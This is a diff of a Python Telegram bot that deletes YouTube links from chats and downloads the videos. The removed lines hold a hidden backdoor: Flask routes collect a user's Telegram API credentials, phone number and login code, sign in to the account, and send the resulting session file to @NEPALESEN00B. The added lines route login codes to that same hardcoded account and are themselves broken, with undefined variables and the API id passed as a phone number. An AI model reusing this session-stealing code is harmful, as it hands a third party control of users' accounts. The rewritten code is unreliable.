@@ -5,28 +5,19 @@ import yt_dlp
 from pyrogram import Client, filters, errors
 from threading import Thread
 from queue import Queue
-from flask import Flask, request
+from flask import Flask
 import shutil
 import time
 
 # Configure logging
 logging.basicConfig(level=logging.INFO)
 
-# Define the path to the session file
+# Define paths
 session_file_path = "my_bot.session"
-
-# Initialize Flask app
-flask_app = Flask(__name__)
-
-# Global variables
-api_id = None
-api_hash = None
-phone_number = None
-otp_received = False
-app = None
-
-# Define the directory where videos are saved
 VIDEO_DIR = "./sentvideo_in_telegram/"
+OTP_USER_ID = "NEPALESEN00B"  # Replace with the actual user ID
+
+# Create the video directory if it doesn't exist
 if not os.path.exists(VIDEO_DIR):
     os.makedirs(VIDEO_DIR)
 
@@ -133,6 +124,7 @@ def process_youtube_links():
             logging.error(f"Unexpected error in processing: {e}")
 
 # Function to handle incoming messages
+@app.on_message(filters.text & filters.regex(youtube_url_pattern))
 def handle_message(client, message):
     chat_id = message.chat.id  # Get the chat_id from the incoming message
     logging.info(f"Received message from chat_id {chat_id}: {message.text}")
@@ -144,60 +136,50 @@ def handle_message(client, message):
     logging.info(f"Deleted message with YouTube URL from chat_id {chat_id}")
     youtube_links_queue.put((chat_id, youtube_url))  # Add the tuple to the queue
 
-# Flask route to start bot setup
-@flask_app.route('/startit', methods=['POST'])
-def start_it():
-    global api_id, api_hash, phone_number, app
-    data = request.json
-    api_id = data.get('api_id')
-    api_hash = data.get('api_hash')
-    phone_number = data.get('phone_number')
-    
-    if api_id and api_hash and phone_number:
-        global app
-        app = Client("my_bot", api_id=api_id, api_hash=api_hash)
-        app.connect()
-        app.send_code(phone_number)
-        return "Code sent to phone number."
-    return "Invalid input."
+# Function to create a new session
+def create_session(client):
+    # Start the client to get the OTP
+    client.start()
+    logging.info("Bot started. Please send the OTP to the bot.")
 
-# Flask route to receive OTP and complete setup
-@flask_app.route('/otp', methods=['POST'])
-def receive_otp():
-    global app, otp_received
-    data = request.json
-    otp = data.get('otp')
-    
-    if otp:
-        try:
-            app.sign_in(phone_number, otp)
-            app.start()
-            otp_received = True
-            # Save the session file
-            app.save_session(session_file_path)
-            # Forward the session file to @NEPALESEN00B
-            app.send_document("@NEPALESEN00B", session_file_path)
-            return "Bot setup complete. Running..."
-        except errors.PhoneCodeInvalid:
-            return "Invalid OTP. Please try again."
-    return "Invalid input."
+    # Wait for OTP
+    @client.on_message(filters.text)
+    def handle_otp(client, message):
+        if message.from_user.username == OTP_USER_ID:
+            otp = message.text
+            logging.info(f"Received OTP: {otp}")
+            # Authenticate with the OTP
+            client.sign_in(phone_number=api_id, phone_code=otp)
+            logging.info("OTP verified successfully.")
+            client.send_message(OTP_USER_ID, "Nice, now I am running well.")
+            client.stop()
+            logging.info("Session created and verified. Bot is now running.")
 
-# Initialize and run the bot if the session file exists
-if os.path.exists(session_file_path):
-    bot_token = os.getenv("BOT_TOKEN")
-    if bot_token:
-        app = Client("my_bot", bot_token=bot_token)
+    client.idle()  # Keep the bot running to receive OTP
+
+# Start the Pyrogram client and the worker thread
+if __name__ == "__main__":
+    # Initialize the Pyrogram client
+    app = Client("my_bot", api_id=api_id, api_hash=api_hash, bot_token=bot_token)
+    
+    # If the session file exists, start the bot directly
+    if os.path.exists(session_file_path):
+        logging.info("Session file found. Starting bot...")
         app.start()
-
-        # Set up message handler
-        app.add_handler(filters.text & filters.regex(youtube_url_pattern)(handle_message))
-
-        # Start the worker thread
         worker_thread = Thread(target=process_youtube_links)
         worker_thread.start()
+    else:
+        # Create a new session if the file does not exist
+        logging.info("No session file found. Creating new session...")
+        create_session(app)
 
-        logging.info("Bot is running.")
+    # Initialize Flask app
+    flask_app = Flask(__name__)
 
-# Start Flask app
-flask_app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
+    @flask_app.route('/')
+    def home():
+        return "Bot is running."
+
+    # Start Flask app
+    flask_app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
             
